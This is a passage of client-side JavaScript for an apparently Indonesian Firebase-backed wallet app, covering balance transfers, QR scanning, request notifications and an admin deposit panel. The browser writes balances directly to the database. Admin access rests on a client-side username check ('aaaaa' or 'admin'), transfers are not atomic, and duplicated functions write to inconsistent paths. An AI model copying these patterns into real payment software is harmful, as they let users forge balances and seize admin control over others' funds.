                    icon: 'success',
                    title: 'QRIS VALID TERDETEKSI',
                    text: `Tujuan Transfer: @${detectedUser.toUpperCase()}. Silakan masukkan nominal transfer saldo Anda.`,
                    background: '#050505',
                    color: '#00f2ea',
                    confirmButtonColor: '#00f2ea'
                });
            } else {
                ErenAlert.error("Format Salah", "Berkas gambar tersebut bukan QRIS Personal resmi dari CUBE Cloud!");
            }
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
    
    // Reset nilai input agar user bisa upload gambar yang sama berulang kali jika dibutuhkan
    event.target.value = "";
}
function executeHubTransferSaldo() {

    const originalInput = document.getElementById('hub-tf-target').value.trim();
    const targetUser = originalInput.toLowerCase();

    const amountInput = document.getElementById('hub-tf-amount').value.trim();
    const inputAmount = parseInt(amountInput);

    // Ambil session user login
    const senderUserRaw =
        (typeof currentUser !== 'undefined' && currentUser)
        ? currentUser
        : localStorage.getItem('cube_username');

    if (!senderUserRaw) {
        return ErenAlert.error(
            "Sesi Habis",
            "Silakan login kembali!"
        );
    }

    const senderUser = senderUserRaw.trim().toLowerCase();

    // VALIDASI
    if (!originalInput || !amountInput) {
        return ErenAlert.error(
            "Gagal!",
            "Isi username tujuan dan nominal transfer!"
        );
    }

    if (isNaN(inputAmount) || inputAmount < 1000) {
        return ErenAlert.error(
            "Gagal!",
            "Minimal transfer Rp 1.000"
        );
    }

    if (senderUser === targetUser) {
        return ErenAlert.error(
            "Gagal!",
            "Tidak bisa transfer ke akun sendiri!"
        );
    }

    ErenAlert.loading("Memproses transfer saldo...");

    // AMBIL DATA PENGIRIM
    db2.ref("cube_users/" + senderUser).once("value")
  .then(senderSnap => {

    if (!senderSnap.exists()) {

        Swal.close();

        return ErenAlert.error(
            "Error!",
            "Data akun pengirim tidak ditemukan."
        );
    }

    // =======================
    // AMBIL DATA PENERIMA
    // =======================

    db2.ref("cube_users/" + targetUser).once("value")
    .then(receiverSnap => {

        if (!receiverSnap.exists()) {

            Swal.close();

            return ErenAlert.error(
                "Gagal!",
                `Username @${targetUser} tidak ditemukan.`
            );
        }

        const senderData = senderSnap.val();
        const receiverData = receiverSnap.val();

        const senderBalance =
            parseInt(senderData.balance || 0);

        const receiverBalance =
            parseInt(receiverData.balance || 0);

        // =======================
        // VALIDASI SALDO
        // =======================

        if (senderBalance < inputAmount) {

            Swal.close();

            return ErenAlert.error(
                "Saldo Kurang!",
                `Saldo Anda Rp ${senderBalance.toLocaleString('id-ID')}`
            );
        }

        // =======================
        // HITUNG SALDO BARU
        // =======================

        const newSenderBalance =
            senderBalance - inputAmount;

        const newReceiverBalance =
            receiverBalance + inputAmount;

        // =======================
        // UPDATE DATABASE
        // =======================

        const updates = {};

        // SALDO
        updates[
            "cube_users/" + senderUser + "/balance"
        ] = newSenderBalance;

        updates[
            "cube_users/" + targetUser + "/balance"
        ] = newReceiverBalance;

        // =======================
        // HISTORY
        // =======================

        const trxId = "TF-" + Date.now();

        updates[
            "cube_users/" + senderUser + "/history/" + trxId
        ] = {
            type: "transfer_out",
            target: targetUser,
            amount: inputAmount,
            time: Date.now()
        };

        updates[
            "cube_users/" + targetUser + "/history/" + trxId
        ] = {
            type: "transfer_in",
            from: senderUser,
            amount: inputAmount,
            time: Date.now()
        };

        // =======================
        // NOTIFIKASI
        // =======================

        const notifId = "NOTIF-" + Date.now();

        // NOTIF PENGIRIM
        updates[
            "cube_users/" + senderUser + "/notifications/" + notifId
        ] = {
            title: "Transfer Keluar",
            message:
                "Saldo anda -Rp " +
                inputAmount.toLocaleString('id-ID') +
                " anda mentransfer ke @" +
                targetUser,
            type: "transfer_out",
            amount: inputAmount,
            target: targetUser,
            time: Date.now()
        };

        // NOTIF PENERIMA
        updates[
            "cube_users/" + targetUser + "/notifications/" + notifId
        ] = {
            title: "Transfer Masuk",
            message:
                "Anda menerima saldo sebesar Rp " +
                inputAmount.toLocaleString('id-ID') +
                " dari @" +
                senderUser,
            type: "transfer_in",
            amount: inputAmount,
            from: senderUser,
            time: Date.now()
        };

        // =======================
        // EKSEKUSI UPDATE
        // =======================

        db2.ref().update(updates)
        .then(() => {

            Swal.close();

            // UPDATE LOCAL STORAGE
            localStorage.setItem(
                "cube_balance",
                newSenderBalance
            );

            // UPDATE UI
            if (typeof updateBalanceDisplay === "function") {
                updateBalanceDisplay(newSenderBalance);
            }

            // ALERT SUCCESS
            ErenAlert.success(
                "Transfer Berhasil!",
                "Rp " +
                inputAmount.toLocaleString('id-ID') +
                " berhasil dikirim ke @" +
                targetUser
            );

            // RESET INPUT
            document.getElementById('hub-tf-target').value = "";
            document.getElementById('hub-tf-amount').value = "";

        })
        .catch(err => {

            Swal.close();

            console.error(err);

            ErenAlert.error(
                "Database Error",
                "Gagal update saldo."
            );

        });

    })
    .catch(err => {

        Swal.close();

        console.error(err);

        ErenAlert.error(
            "Error!",
            "Gagal mengambil data penerima."
        );

    });

})
.catch(err => {

    Swal.close();

    console.error(err);

    ErenAlert.error(
        "Koneksi Error",
        "Gagal terhubung ke Firebase."
    );

});
}
// FUNGSI UPDATE SALDO SIMULTAN BERDASARKAN ID KUNCI FIREBASE
function executeFinalBalancesUpdate(senderKey, receiverKey, senderCurrentBalance, receiverCurrentBalance, amount, senderName, receiverName) {
    let updatedMyBalance = senderCurrentBalance - amount;
    let updatedTargetBalance = receiverCurrentBalance + amount;

    // Update ke node "users/ID_UNIK/balance"
db2.ref("cube_users/" + senderKey + "/balance").set(updatedMyBalance);
db2.ref("cube_users/" + receiverKey + "/balance").set(updatedTargetBalance, function(err) {
        if (err) {
            Swal.close();
            return ErenAlert.error("Sistem Error", "Gagal memproses alokasi dana di server.");
        }

        // Catat Log Transaksi di folder riwayat mutasi
        const txId = "TX-" + Date.now();
        db2.ref("cube_transactions/" + txId).set({
            tx_id: txId,
            type: "Transfer Saldo",
            sender: senderName,
            receiver: receiverName,
            amount: amount,
            timestamp: new Date().toISOString()
        });

        Swal.close();
        ErenAlert.success("Transfer Berhasil!", `Sukses mengirimkan Rp ${amount.toLocaleString('id-ID')} ke @${receiverName.toUpperCase()}`);
        
        // Bersihkan Form
        document.getElementById('hub-tf-target').value = "";
        document.getElementById('hub-tf-amount').value = "";
        
        // Sinkronisasi data lokal & UI tampilan
        localStorage.setItem('cube_balance', updatedMyBalance);
        
        const hubBalanceView = document.getElementById('hub-live-balance');
        const sidebarBalanceView = document.getElementById('sidebar-user-balance');
        
        if (hubBalanceView) hubBalanceView.innerText = "Rp " + updatedMyBalance.toLocaleString('id-ID');
        if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + updatedMyBalance.toLocaleString('id-ID');
        if (typeof updateBalanceUI === 'function') updateBalanceUI(updatedMyBalance);
    });
}

// FUNGSI EKSEKUSI MUTASI SALDO REALTIME KE FIREBASE (DENGAN RINCIAN NOTIFIKASI BARU)
function processHubWalletBalances(sender, receiver, senderCurrentBalance, receiverCurrentBalance, amount) {
    let updatedMyBalance = senderCurrentBalance - amount;
    let updatedTargetBalance = receiverCurrentBalance + amount;

    // 1. Kurangi saldo pengirim di folder users/ID_KUNCI
    db2.ref("users/" + sender + "/balance").set(updatedMyBalance);
    
    // 2. Tambah saldo penerima di folder users/ID_KUNCI
    db2.ref("users/" + receiver + "/balance").set(updatedTargetBalance, function(err) {
        if (err) {
            Swal.close();
            return ErenAlert.error("Sistem Error", "Gagal memproses alokasi dana di server.");
        }

        // 3. Catat Log Transaksi di folder riwayat mutasi
        const txId = "TX-" + Date.now();
        db2.ref("cube_transactions/" + txId).set({
            tx_id: txId,
            type: "Transfer Saldo",
            sender: sender,
            receiver: receiver,
            amount: amount,
            timestamp: new Date().toISOString()
        });

        Swal.close();
        
        // 🟢 UPGRADE NOTIFIKASI: Menampilkan teks pengurangan saldo pengirim dan pengiriman ke target user
        ErenAlert.success(
            "Transfer Berhasil!", 
            `Saldo Anda: -Rp ${amount.toLocaleString('id-ID')} dan mentransferkan ke @${receiver.toUpperCase()}`
        );
        
        // 4. Bersihkan kolom input form otomatis setelah sukses
        document.getElementById('hub-tf-target').value = "";
        document.getElementById('hub-tf-amount').value = "";
        
        // 5. SINKRONISASI REALTIME: Simpan saldo baru ke memori browser
        localStorage.setItem('cube_balance', updatedMyBalance);
        
        // 6. SINKRONISASI REALTIME: Kurangi saldo yang tampil di layar Hub QRIS & Sidebar secara instan
        const hubBalanceView = document.getElementById('hub-live-balance');
        const sidebarBalanceView = document.getElementById('sidebar-user-balance');
        
        if (hubBalanceView) {
            hubBalanceView.innerText = "Rp " + updatedMyBalance.toLocaleString('id-ID');
        }
        if (sidebarBalanceView) {
            sidebarBalanceView.innerText = "Rp " + updatedMyBalance.toLocaleString('id-ID');
        }
        
        // Jalankan fungsi penyegaran UI bawaan sistem jika tersedia
        if (typeof updateBalanceUI === 'function') {
            updateBalanceUI(updatedMyBalance);
        }
    });
}
function generateQRIS() {
    const amount = document.getElementById('qris-amount').value.trim();
    if(!amount || amount < 1000) return ErenAlert.error("Error!", "Minimal nominal Rp 1.000!");

    ErenAlert.loading("Generating Dynamic QRIS...");

    // Tembak ke API Node.js Server Subdomain kamu
    fetch('http://pmlcube.mega-store.my.id:3000/api/generate-qris', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: currentUser, 
            amount: parseInt(amount)
        })
    })
    .then(res => {
        if (!res.ok) throw new Error("Server backend merespon eror / offline.");
        return res.json();
    })
    .then(data => {
        Swal.close(); // Tutup loading spinner
        
        if(data.success && data.qr_url) {
            // 1. Tampilkan area gambar QRIS di UI
            document.getElementById('qris-result-area').style.display = 'block';
            
            // 2. Ubah source gambar QRIS ke link QR_URL dari TemanQRIS
            document.getElementById('dynamic-qris-img').src = data.qr_url;
            
            // 3. Tambahkan ke log riwayat aplikasi
            if (typeof addHistory === 'function') {
                addHistory("Generate QRIS Rp " + parseInt(amount).toLocaleString('id-ID'), "PENDING", "status-process");
            }
            ErenAlert.success("Sukses!", "QRIS Dinamis berhasil dibuat. Silakan scan & bayar.");
        } else {
            ErenAlert.error("Gagal!", data.message || "Gagal memproses pembuatan QRIS ke pihak payment gateway.");
        }
    })
    .catch(err => {
        Swal.close();
        console.error(err);
        ErenAlert.error("API Error", "Gagal terhubung ke server backend panel pmlcube. Pastikan server Node.js Anda sudah dinyalakan!");
    });
}
// ==========================================================================
// CUBE-PAY TRANSACTION SYSTEM ENGINE (TRANSFER, REQUEST, & QRIS GENERATOR)
// ==========================================================================

// 1. Fungsi Navigasi Sub Tab
function switchCubePayTab(tabName) {
    document.getElementById('sub-pay-transfer').style.display = tabName === 'tf' ? 'block' : 'none';
    document.getElementById('sub-pay-minta').style.display = tabName === 'minta' ? 'block' : 'none';
    document.getElementById('sub-pay-qris').style.display = tabName === 'qris' ? 'block' : 'none';
    
    if(tabName === 'qris') {
        generateMyInternalQRIS();
    }
}

// 2. Fungsi Membuat QRIS Khusus Pengguna (1 Orang 1 QRIS Unik Permanen)
function generateMyInternalQRIS() {
    const qrArea = document.getElementById('qrcode-internal-area');
    if(!qrArea) return;
    
    qrArea.innerHTML = ""; // Bersihkan sisa render sebelumnya
    document.getElementById('qris-username-lbl').innerText = currentUser.toUpperCase();

    // Data QRIS diisi dengan format string enkripsi siber identitas terproteksi
    const qrisDataPayload = `CUBEPAY_ID:${currentUser.toLowerCase()}`;

    // Render QR Code baru ke elemen div menggunakan library qrcode.js
    new QRCode(qrArea, {
        text: qrisDataPayload,
        width: 200,
        height: 200,
        colorDark : "#000000",
        colorLight : "#ffffff",
        correctLevel : QRCode.CorrectLevel.H
    });
}

// 3. FUNGSI UTAMA: PROSES TRANSFER SALDO ANTAR USER CLOUD DB2
function processTransferSaldo(targetUserManual = null) {
    const targetUser = (targetUserManual ? targetUserManual : document.getElementById('tf-target-user').value).trim().toLowerCase();
    const amountInput = document.getElementById('tf-amount').value;
    const amount = parseInt(amountInput);

    if(!targetUser || !amount || amount <= 0) {
        return ErenAlert.error("Gagal Transaksi", "Identitas Username atau Nominal Saldo tidak valid!");
    }
    if(targetUser === currentUser.toLowerCase()) {
        return ErenAlert.error("Sistem Ditolak", "Anda tidak dapat mentransfer saldo ke akun Anda sendiri!");
    }

    ErenAlert.loading("Mengautentikasi Transaksi...");

    // Ambil Profil Akun Pengirim dari DB2
    db2.ref("cube_users/" + currentUser).once("value", function(senderSnap) {
        if(!senderSnap.exists()) {
            Swal.close();
            return ErenAlert.error("Eror", "Data akun pengirim tidak valid.");
        }

        const senderData = senderSnap.val();
        const currentSenderBalance = parseInt(senderData.balance || 0);

        if(currentSenderBalance < amount) {
            Swal.close();
            return ErenAlert.error("Saldo Kurang", `Saldo Anda tidak mencukupi untuk melakukan transfer.\nSisa Saldo: Rp ${currentSenderBalance.toLocaleString('id-ID')}`);
        }

        // Cek Keberadaan Akun Target Penerima di DB2
        db2.ref("cube_users/" + targetUser).once("value", function(targetSnap) {
            if(!targetSnap.exists()) {
                Swal.close();
                return ErenAlert.error("Target Tidak Ada", `Username siber "${targetUser}" tidak terdaftar di database cloud 2.`);
            }

            const targetData = targetSnap.val();
            const currentTargetBalance = parseInt(targetData.balance || 0);

            // MUTASI ATOMIK JALUR CEPAT: POTONG SALDO PENGIRIM & TAMBAH KE PENERIMA
            db2.ref("cube_users/" + currentUser + "/balance").set(currentSenderBalance - amount);
            db2.ref("cube_users/" + targetUser + "/balance").set(currentTargetBalance + amount);

            // Kirim Notifikasi Masuk ke HP Penerima
            db2.ref("cube_notifications/" + targetUser).push({
                message: `💰 SALDO MASUK!\nAnda menerima transfer saldo sebesar Rp ${amount.toLocaleString('id-ID')} dari user ${currentUser.toUpperCase()}.\nSaldo Anda sekarang: Rp ${(currentTargetBalance + amount).toLocaleString('id-ID')}.`,
                color: "#00ffea",
                isRead: false,
                timestamp: Date.now()
            });

            // Perbarui UI Balance Lokal Pengirim
            if(typeof updateBalanceUI === 'function') updateBalanceUI(currentSenderBalance - amount);
            const balView = document.getElementById('cubepay-balance-view');
            if(balView) balView.innerText = (currentSenderBalance - amount).toLocaleString('id-ID');

            Swal.close();
            ErenAlert.success("Transfer Berhasil!", `Sukses mengirimkan Rp ${amount.toLocaleString('id-ID')} ke ${targetUser.toUpperCase()}`);
            
            // Reset Input form
            document.getElementById('tf-target-user').value = "";
            document.getElementById('tf-amount').value = "";
        });
    });
}

// 4. FUNGSI UTAMA: MINTA SALDO (KIRIM NOTIFIKASI INVOICE BILL)
function sendRequestSaldo() {
    const targetUser = document.getElementById('minta-target-user').value.trim().toLowerCase();
    const amount = parseInt(document.getElementById('minta-amount').value);

    if(!targetUser || !amount || amount <= 0) {
        return ErenAlert.error("Gagal", "Lengkapi username target dan nominal permintaan!");
    }
    if(targetUser === currentUser.toLowerCase()) {
        return ErenAlert.error("Ditolak", "Tidak bisa meminta saldo ke diri sendiri.");
    }

    ErenAlert.loading("Mengirim Permintaan Saldo...");

    db2.ref("cube_users/" + targetUser).once("value", function(snapshot) {
        Swal.close();
        if(!snapshot.exists()) {
            return ErenAlert.error("Gagal", "Username target tidak ditemukan.");
        }

        // Tembak tagihan pembayaran langsung ke panel notifikasi target
        db2.ref("cube_notifications/" + targetUser).push({
            message: `⚠️ PERMINTAAN SALDO!\nUser ${currentUser.toUpperCase()} meminta saldo kepada Anda sebesar Rp ${amount.toLocaleString('id-ID')}.\nSilakan transfer manual jika ingin membantu.`,
            color: "#ffaa00",
            isRead: false,
            timestamp: Date.now()
        });

        ErenAlert.success("Terkirim!", `Permintaan saldo telah diteruskan ke panel ${targetUser.toUpperCase()}`);
        document.getElementById('minta-target-user').value = "";
        document.getElementById('minta-amount').value = "";
    });
}

// 5. FUNGSI UTAMA: UPLOAD SS QRIS & SCAN OTOMATIS (MENGGUNAKAN JSQR DECODER)
function processScanQRISFile() {
    const fileInput = document.getElementById('qris-scanner-input');
    if (!fileInput.files || fileInput.files.length === 0) {
        return ErenAlert.error("Gagal", "Silakan pilih berkas foto screenshot QRIS terlebih dahulu!");
    }

    ErenAlert.loading("Memecahkan Kode Enkripsi Gambar...");

    const file = fileInput.files[0];
    const reader = new FileReader();
    
    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            // Buat canvas sementara untuk membaca data piksel gambar
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0, img.width, img.height);
            
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            
            // Pecahkan matriks kode QR menggunakan library jsQR
            const code = jsQR(imageData.data, imageData.width, imageData.height, {
                inversionAttempts: "dontInvert",
            });
            
            Swal.close();

            if (code && code.data.startsWith("CUBEPAY_ID:")) {
                // Berhasil membaca QRIS khusus aplikasi CUBE
                const detectedUser = code.data.split(":")[1];
                
                // Isi otomatis kolom nama target username hasil scan
                document.getElementById('tf-target-user').value = detectedUser;
                
                Swal.fire({
                    icon: 'success',
                    title: 'QRIS VALID TERDETEKSI',
                    text: `Tujuan Transfer: ${detectedUser.toUpperCase()}. Silakan isi nominal saldo dan klik tombol Kirim.`,
                    background: '#050505',
                    color: '#00f2ea',
                    confirmButtonColor: '#00f2ea'
                });
            } else {
                ErenAlert.error("QRIS Tidak Valid", "Gambar yang diupload bukan QRIS resmi dari aplikasi CUBE ini!");
            }
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
}
// ==========================================================================
// CENTRAL CONTROLLER: ENGINE PERPINDAHAN SUB-TAB INTERNAL CUBEQRIS
// ==========================================================================
function switchQrisTab(tabId) {
    // Sembunyikan semua kontainer panel sub-tab
    const panels = document.querySelectorAll('.qris-sub-panel');
    panels.forEach(panel => {
        panel.style.display = 'none';
    });

    // Nyalakan panel tab yang dipilih
    const activePanel = document.getElementById(tabId);
    if (activePanel) activePanel.style.display = 'block';

    // Atur ulang efek visual active status pada tombol navigasi
    const tabs = ['tab-view-qris', 'tab-view-transfer', 'tab-view-topup', 'tab-view-mutasi'];
    tabs.forEach(tId => {
        const btn = document.getElementById('btn-' + tId);
        if (btn) btn.classList.remove('active');
    });

    // Tambahkan class aktif ke tombol yang sedang ditekan
    const activeBtn = document.getElementById('btn-' + tabId);
    if (activeBtn) activeBtn.classList.add('active');
}

// ==========================================================================
// LOGGER SYSTEM: MEMASUKKAN RIWAYAT KUSTOM KE LOG TAB MUTASI REALTIME
// ==========================================================================
function addHubMutationLog(desc, amount, type) {
    const listContainer = document.getElementById('hub-history-list');
    if (!listContainer) return;

    // Bersihkan teks kosong pada pengisian pertama
    if (listContainer.innerHTML.includes("Belum ada data mutasi")) {
        listContainer.innerHTML = "";
    }

    // Set styling badge berdasarkan tipe transaksi
    let colorStyle = "#ff0055"; // Default Keluar (Transfer)
    let sign = "-";
    if (type === 'IN' || type === 'TOPUP') {
        colorStyle = "#00ff00"; // Masuk / Isi Saldo
        sign = "+";
    }

    const timeString = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
    
    const logItem = document.createElement('div');
    logItem.style.cssText = "background: #050505; border: 1px solid #1c1c1c; padding: 10px; border-radius: 6px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;";
    logItem.innerHTML = `
        <div>
            <div style="font-family: 'Rajdhani'; font-weight: bold; color: #fff; font-size: 0.85rem;">${desc}</div>
            <div style="font-size: 0.65rem; color: #555;">Hari ini, Pukul ${timeString} WIB</div>
        </div>
        <div style="font-family: 'Orbitron'; font-size: 0.85rem; font-weight: bold; color: ${colorStyle};">
            ${sign} Rp ${parseInt(amount).toLocaleString('id-ID')}
        </div>
    `;

    listContainer.insertBefore(logItem, listContainer.firstChild);
}
// ==========================================================================
// ADMIN LOGIC GATEWAY: CEK OTORITAS & TAMPILKAN PANEL JIKA VALID
// ==========================================================================
// ==========================================================================
// FIX ENGINE: PENGATUR VALIDASI AKSES & MANIPULASI SALDO LOCALSTORAGE
// ==========================================================================
// ==========================================================================
// ENGINE PERINTAH ADMIN: VALIDASI USER DAN MANIPULASI FIREBASE REALTIME
// ==========================================================================
function checkAdminOtoritasDashboard() {
    const adminPanel = document.getElementById('admin-command-panel');
    if (!adminPanel || !currentUser) return;

    // JIKA USER YANG LOGIN ADALAH "aaaaa", MAKA KITA LANGSUNG AKTIFKAN PANELNYA
    if (currentUser.toLowerCase() === "aaaaa") {
        adminPanel.style.display = "block";
    } else {
        adminPanel.style.display = "none";
    }
}

function executeAdminAction(actionType) {
    const targetUser = document.getElementById('adm-cmd-target').value.trim().toLowerCase();
    const amountStr = document.getElementById('adm-cmd-amount').value.trim();

    if (!targetUser || !amountStr) {
        return ErenAlert.error("Gagal", "Username target dan nominal saldo wajib diisi!");
    }

    const inputAmount = parseInt(amountStr);
    if (inputAmount <= 0) {
        return ErenAlert.error("Gagal", "Nominal saldo harus lebih besar dari 0!");
    }

    ErenAlert.loading("Menghubungi Basis Server Cloud...");

    // Menggunakan variabel 'db' (bawaan file index.html aslimu) untuk membaca Firebase
    db.ref("cube_users/" + targetUser).once("value", function(targetSnap) {
        if (!targetSnap.exists()) {
            Swal.close();
            return ErenAlert.error("Gagal", `User @${targetUser.toUpperCase()} tidak terdaftar di server database!`);
        }

        // Ambil saldo target saat ini atau set 0 jika kosong
        let currentTargetBalance = parseInt(targetSnap.val().balance) || 0;
        let updatedBalance = currentTargetBalance;
        let statusText = "";

        if (actionType === "ADD") {
            updatedBalance = currentTargetBalance + inputAmount;
            statusText = `Sukses MENAMBAH saldo Rp ${inputAmount.toLocaleString('id-ID')} ke akun @${targetUser.toUpperCase()}`;
        } else if (actionType === "REDUCE") {
            if (currentTargetBalance < inputAmount) {
                Swal.close();
                return ErenAlert.error("Gagal", `Saldo target tidak mencukupi untuk dikurangi! (Sisa saldo target: Rp ${currentTargetBalance.toLocaleString('id-ID')})`);
            }
            updatedBalance = currentTargetBalance - inputAmount;
            statusText = `Sukses MENGURANGI saldo Rp ${inputAmount.toLocaleString('id-ID')} dari akun @${targetUser.toUpperCase()}`;
        }

        // Simpan nilai baru ke Firebase Realtime Database
        db.ref("cube_users/" + targetUser + "/balance").set(updatedBalance, function(error) {
            Swal.close();
            if (error) {
                ErenAlert.error("Server Error", "Gagal memperbarui data di server cloud Firebase.");
            } else {
                ErenAlert.success("Command Sukses!", statusText);
                
                // Kosongkan form input kembali
                document.getElementById('adm-cmd-target').value = "";
                document.getElementById('adm-cmd-amount').value = "";
                
                // Sinkronisasikan tampilan UI jika admin mengisi/mengurangi saldonya sendiri
                if (targetUser === currentUser.toLowerCase()) {
                    const hubBalanceView = document.getElementById('hub-live-balance');
                    const sidebarBalanceView = document.getElementById('sidebar-user-balance');
                    if (hubBalanceView) hubBalanceView.innerText = "Rp " + updatedBalance.toLocaleString('id-ID');
                    if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + updatedBalance.toLocaleString('id-ID');
                }
            }
        });
    });
}
// ==========================================================================
// CENTRAL REALTIME SYNC: MENYAMAKAN SALDO UTAMA & CUBEQRIS HUB
// ==========================================================================
function startLiveBalanceSync(username) {
    if (!db) return;
    
    // Pasang listener .on('value') agar Firebase otomatis mendeteksi perubahan saldo
    db.ref("cube_users/" + username.toLowerCase()).on("value", function(snapshot) {
        if (snapshot.exists()) {
            const userData = snapshot.val();
            const currentBalance = parseInt(userData.balance || 0);
            
            // 1. Amankan ke penyimpanan lokal browser
            localStorage.setItem('cube_balance', currentBalance);
            
            // 2. Tembakkan ke UI Saldo Utama Dashboard / Sidebar Anda
            if (typeof updateBalanceUI === 'function') {
                updateBalanceUI(currentBalance);
            }
            const sidebarBalanceView = document.getElementById('sidebar-user-balance');
            if (sidebarBalanceView) {
                sidebarBalanceView.innerText = "Rp " + currentBalance.toLocaleString('id-ID');
            }

            // 3. PAKSA Tampilan Saldo di CUBEQRIS HUB Berubah Menjadi Sama Persis
            const hubBalanceView = document.getElementById('hub-live-balance');
            if (hubBalanceView) {
                hubBalanceView.innerText = "Rp " + currentBalance.toLocaleString('id-ID');
            }
        }
    });
}
// ==========================================================================
// UPGRADED NAVIGATION ROUTER (ROLE CHECK UNTUK TOMBOL ADMIN QRIS)
// ==========================================================================
if (typeof showSection !== 'undefined') {
    const originalShowSection = showSection;
    showSection = function(sectionId) {
        // Jalankan sistem navigasi dasar bawaan aplikasi Anda
        if (typeof originalShowSection === 'function') {
            originalShowSection(sectionId);
        }
        
        // Kondisi khusus ketika user masuk ke layar menu CUBEQRIS HUB
        if (sectionId === 'cubeqris-hub') {
            const savedBalance = localStorage.getItem('cube_balance') || 0;
            
            // 1. Selaraskan nilai visual saldo utama
            const hubBalanceView = document.getElementById('hub-live-balance');
            if (hubBalanceView) {
                hubBalanceView.innerText = "Rp " + parseInt(savedBalance).toLocaleString('id-ID');
            }
            
            // 2. DETEKSI STATUS ROLE ADMIN
            const adminQrisBtn = document.getElementById('admin-hub-addsaldo-btn');
            if (adminQrisBtn) {
                // Jika variabel currentUser adalah 'admin' atau berhuruf kecil 'admin'
                if (typeof currentUser !== 'undefined' && currentUser.toLowerCase() === 'admin') {
                    adminQrisBtn.style.display = 'block'; // Munculkan tombol jika dia admin
                } else {
                    adminQrisBtn.style.display = 'none';  // Sembunyikan jika user biasa
                }
            }
            
            // Load ulang riwayat mutasi agar up-to-date
            if (typeof loadHubMutations === 'function') {
                loadHubMutations();
            }
        }
    };
}

function saveTransferToFirebase(sender, receiver, senderBal, receiverBal, amount) {
    const timestamp = Date.now();
    const updates = {};
    
    const newSenderBal = senderBal - amount;
    const newReceiverBal = parseInt(receiverBal) + amount;

    // Masukkan ke dalam satu paket update massal Firebase
    updates["cube_users/" + sender + "/balance"] = newSenderBal;
    updates["cube_users/" + receiver + "/balance"] = newReceiverBal;

    const keySrc = db.ref("cube_mutations/" + sender).push().key;
    const keyDst = db.ref("cube_mutations/" + receiver).push().key;
    const keyNotif = db.ref("cube_notifications/" + receiver).push().key;

    updates["cube_mutations/" + sender + "/" + keySrc] = {
        type: "transfer_out",
        target: receiver,
        amount: amount,
        timestamp: timestamp,
        info: `Transfer ke @${receiver.toUpperCase()}`
    };

    updates["cube_mutations/" + receiver + "/" + keyDst] = {
        type: "transfer_in",
        target: sender,
        amount: amount,
        timestamp: timestamp,
        info: `Terima dari @${sender.toUpperCase()}`
    };

    updates["cube_notifications/" + receiver + "/" + keyNotif] = {
        message: `Saldo masuk Rp ${amount.toLocaleString('id-ID')} dari @${sender.toUpperCase()}`,
        timestamp: timestamp,
        read: false
    };

    db.ref().update(updates, function(error) {
        Swal.close();
        if (error) {
            return ErenAlert.error("Gagal!", "Gagal memperbarui saldo server.");
        }

        // Sinkronisasi paksa data lokal demi UI yang instan tanpa refresh halaman
        localStorage.setItem('cube_balance', newSenderBal);
        
        const hubBalView = document.getElementById('hub-live-balance');
        const sidebarBalView = document.getElementById('sidebar-user-balance');
        if (hubBalView) hubBalView.innerText = "Rp " + newSenderBal.toLocaleString('id-ID');
        if (sidebarBalView) sidebarBalView.innerText = "Rp " + newSenderBal.toLocaleString('id-ID');

        document.getElementById('hub-tf-target').value = "";
        document.getElementById('hub-tf-amount').value = "";

        ErenAlert.success("Sukses!", `Berhasil transfer Rp ${amount.toLocaleString('id-ID')} ke @${receiver.toUpperCase()}`);
    });
}
// ==========================================================================
// UPGRADED ADVANCED ADMIN COMMAND PROCESSOR (SUPPORT: addsaldo username)
// ==========================================================================
function executeAdminCommand() {
    const cmdInput = document.getElementById('adm-cmd-text').value.trim();
    
    if (!cmdInput) {
        return ErenAlert.error("Gagal!", "Harap masukkan perintah terminal terlebih dahulu!");
    }

    // 1. FORMAT DETEKSI FITUR BARU: "addsaldo username"
    if (cmdInput.toLowerCase().startsWith('addsaldo ')) {
        // Ambil nama username setelah spasi pertama
        const targetUser = cmdInput.substring(9).trim().toLowerCase();
        
        if (!targetUser) {
            return ErenAlert.error("Format Salah!", "Gunakan format: addsaldo [username]");
        }

        // Tampilkan pop-up input nominal khusus untuk pengisian saldo cepat
        Swal.fire({
            title: 'ADMIN DEPOSIT SYSTEM',
            text: `Masukkan jumlah nominal saldo yang akan ditambahkan ke akun @${targetUser.toUpperCase()}:`,
            input: 'number',
            inputPlaceholder: 'Contoh: 50000',
            showCancelButton: true,
            confirmButtonText: 'Isi Saldo',
            cancelButtonText: 'Batal',
            confirmButtonColor: '#00ff66',
            background: '#111',
            color: '#fff',
            preConfirm: (amount) => {
                if (!amount || isNaN(amount) || parseInt(amount) <= 0) {
                    Swal.showValidationMessage('Nominal harus lebih dari Rp 0!');
                }
                return parseInt(amount);
            }
        }).then((result) => {
            if (result.isConfirmed) {
                // Jalankan injeksi saldo langsung ke database Firebase
                injectSaldoByAdmin(targetUser, result.value);
            }
        });
        return; // Hentikan eksekusi ke bawah karena format khusus sudah diproses
    }

    // 2. LOGIKA PERINTAH BAWAAN LAMA (PENGGUNAAN INPUT FORM BIASA)
    const targetUser = document.getElementById('adm-cmd-target').value.trim().toLowerCase();
    const amountInput = document.getElementById('adm-cmd-amount').value.trim();
    const inputAmount = parseInt(amountInput);

    if (!targetUser || !amountInput) {
        return ErenAlert.error("Gagal!", "Harap isi form username target dan nominal di bawah jika tidak menggunakan command terminal!");
    }
    if (isNaN(inputAmount) || inputAmount <= 0) {
        return ErenAlert.error("Gagal!", "Nominal manipulasi saldo harus valid!");
    }

    ErenAlert.loading("Memproses Command...");

    // Cek aksi dari tombol radio bawaan Anda (isi atau kurangi)
    const cmdAction = document.querySelector('input[name="adm_action"]:checked').value;

    db.ref("cube_users/" + targetUser).once("value").then(snapshot => {
        if (!snapshot.exists()) {
            Swal.close();
            return ErenAlert.error("Gagal!", `User @${targetUser.toUpperCase()} tidak ditemukan di database.`);
        }

        const currentTargetBalance = parseInt(snapshot.val().balance || 0);
        let updatedBalance = currentTargetBalance;
        let statusText = "";
